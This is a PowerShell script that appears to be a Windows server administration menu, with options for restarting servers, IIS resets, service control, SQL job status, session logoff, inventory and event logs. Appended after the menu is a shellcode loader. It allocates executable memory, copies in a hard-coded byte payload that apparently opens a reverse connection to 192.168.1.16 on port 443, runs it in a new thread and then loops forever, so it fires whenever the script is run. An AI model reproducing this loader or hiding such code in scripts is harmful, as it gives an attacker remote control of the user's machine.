














write-host "
write-host "
write-host "
write-host "
write-host "
write-host "


$a = (Get-Host).PrivateData
$a.WarningBackgroundColor = "red"
$a.WarningForegroundColor = "white"





gc env:computername 
Get-Date 

function Read-Choice {
	PARAM([string]$message, [string[]]$choices, [int]$defaultChoice=12, [string]$Title=$null )
  	$Host.UI.PromptForChoice( $caption, $message, [Management.Automation.Host.ChoiceDescription[]]$choices, $defaultChoice )
}

switch(Read-Choice "Use Shortcut Keys:[]" "&Restart","&IISRESET","&WLBS Status","&Job- SQL","&V-Start Service","&C-Stop Service","&Task- Scheduled","&Log-off TS","&Basic Computer Inventory","&Application List","&Process- Remote","&Event- Logs","&Quit"){
	0 { 
		Write-Host "You have selected the option to restart a server" -ForegroundColor Yellow
		$ServerName = Read-Host "Enter the name of the server to be restarted"
		if (Test-connection $ServerName) {
			Get-Date
			write-host “$ServerName is reachable”
			Write-Host "$ServerName is getting restarted"
			Get-Date 
			restart-computer -computername $ServerName -Force 
			Write-Host "Starting continuous ping to test the status"  
			Test-Connection -ComputerName $ServerName -Count 100 | select StatusCode 		
			Start-Sleep -s 300
			Write-Host "Here is the last reboot time: " 
			$wmi=Get-WmiObject -class Win32_OperatingSystem -computer $ServerName 
			$LBTime=$wmi.ConvertToDateTime($wmi.Lastbootuptime)
			$LBTime
			
		}
		else {
				Get-Date
				write-host “$ServerName is not reachable, please check this manually”
				exit
		}

	} 
	1 { 
		Write-Host "You have selected the option to do IISRESET" -ForegroundColor Yellow
		$Server1 = Read-Host "Enter the server name on which iis need to be reset"
		rcmd \\$Server1 iisreset
	} 
	2 {
		Write-Host "You have selected the option to check WLBS status" -ForegroundColor Yellow
		$Server2 = Read-host "Enter the remote computer name" 
		rcmd \\$Server2 wlbs query
		$opt = Read-Host "Do you want to stop/start wlbs on $Server2 (Y/N)"
		if ($opt -eq 'Y') {
			$opt0 = Read-Host "S- To start X- To stop)"
			if ($opt0 -eq 'S') {
				rcmd \\$Server2 wlbs resume
				rcmd \\$Server2 wlbs start
			}
			else {
				if ($opt0 -eq 'X') {
					rcmd \\$Server2 wlbs stop
					rcmd \\$Server2 wlbs suspend
				}
				else {
					exit
				}
				exit
			}
		}
		else {
			exit
		}
	} 
	3 { 
		Write-Host "You have selected the option to get the status of SQL job" -ForegroundColor Yellow
		write-host "Hope you are logged in with an account having SQL access privilege"
		[System.Reflection.Assembly]::LoadWithPartialName(‘Microsoft.SqlServer.SMO’) | out-null
		$instance = Read-Host "Enter the server name"
		$j = Read-Host "Job names starting with....."							
		$s = New-Object (‘Microsoft.SqlServer.Management.Smo.Server’) $instance
		$s.JobServer.Jobs |Where-Object {$_.Name -ilike "$j*"}| SELECT NAME, LASTRUNOUTCOME, LASTRUNDATE 
	} 
	4 {
		Write-Host "You have selected the option to start a service" -ForegroundColor Yellow
		$Server6 = Read-host "Enter the remote computer name"
		Get-Service * -computername $Server6 | where {$_.Status -eq "Stopped"} | Out-GridView 
		$svc6 = Read-host "Enter the name of the service to be started"
		(Get-WmiObject -computer $Server6 Win32_Service -Filter "Name='$svc6'").InvokeMethod("StartService",$null)
	}
	5 {
		Write-Host "You have selected the option to stop a service" -ForegroundColor Yellow
		$Server7 = Read-host "Enter the remote computer name"
		Get-Service * -computername $Server7 | where {$_.Status -eq "Running"} | Out-GridView 
		$svc7 = Read-host "Enter the name of the service to be stopped"
		(Get-WmiObject -computer $Server7 Win32_Service -Filter "Name='$svc7'").InvokeMethod("StopService",$null)
	}
	6 {
		Write-Host "You have selected the option to get the scheduled task status list" -ForegroundColor Yellow
		$Server8 = Read-host "Enter the remote computer name"
		schtasks /query /S $Server8 /FO TABLE /V | Out-GridView 	
	}
	7 {
		Write-Host "You have selected the option to list and log off terminal service sessions" -ForegroundColor Yellow
		Import-Module PSTerminalServices
		$server9 = Read-Host "Enter Remote Server Name"
		$session = Get-TSSession -ComputerName $server9 | SELECT "SessionID","State","IPAddress","ClientName","WindowStationName","UserName"  
		$session
		$s = Read-Host "Enter Session ID, if you want to log off any session"
		Get-TSSession -ComputerName $server9 -filter {$_.SessionID -eq $s} | Stop-TSSession –Force
	}
	8 {
		Write-Host "You have selected the option to get basic computer inventory" -ForegroundColor Yellow
		$server8 = Read-Host "Enter Remote Server Name"
		Get-WMIObject -Class "Win32_BIOS" -Computer $server8 | select SerialNumber
		get-wmiobject -computername  $server8 win32_computersystem
		Get-WmiObject win32_logicaldisk -ComputerName $server8 | select DeviceID, size, FreeSpace
	}
	9 {
		Write-Host "The option to List the Applications installed on a remote machine" -ForegroundColor Yellow
		
		
		$computername= Read-Host "Enter the computer name"
		
		$Branch='LocalMachine' 
		
		$SubBranch="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" 
		$registry=[microsoft.win32.registrykey]::OpenRemoteBaseKey('Localmachine',$computername) 
		$registrykey=$registry.OpenSubKey($Subbranch) 
		$SubKeys=$registrykey.GetSubKeyNames() 
		
		
		
		Foreach ($key in $subkeys) { 
		    $exactkey=$key 
		    $NewSubKey=$SubBranch+"\\"+$exactkey 
		    $ReadUninstall=$registry.OpenSubKey($NewSubKey) 
		    $Value=$ReadUninstall.GetValue("DisplayName") 
		    WRITE-HOST $Value
		} 
	}
	10 {
	Write-Host "You have selected the option to get process details of a remote server" -ForegroundColor Yellow
	$server12 = Read-Host "Enter the remote machine name"
	Get-Process -ComputerName $server12 | Out-GridView 
	}
	11 {
	Write-Host "You have selected the option to get the event log details of a server" -ForegroundColor Yellow
	$server14 = Read-Host "Enter server name"
	[int]$n = Read-Host "Last how many Days?"
	$start1 = (Get-Date).addDays(-[int]$n)   
	$start2 = (Get-Date)
	$opt3 = Read-Host "Do you want to save it to a notepad (Y/N)?" 
		if ($opt3 -eq 'Y') {
		get-eventlog -logname System -EntryType Error -after $start1 -before $start2 -ComputerName $server14 > C:\Scripts\event.txt
		Invoke-Item C:\Scripts\event.txt 
		}
		else {
		get-eventlog -logname System -EntryType Error -after $start1 -before $start2 -ComputerName $server14 | Out-GridView
		}
	}
	12 {
		Write-Host "You have selected the option to exit the tool, Thank you for using this !!!" -ForegroundColor Yellow	
		exit
	}
} 
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x10,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

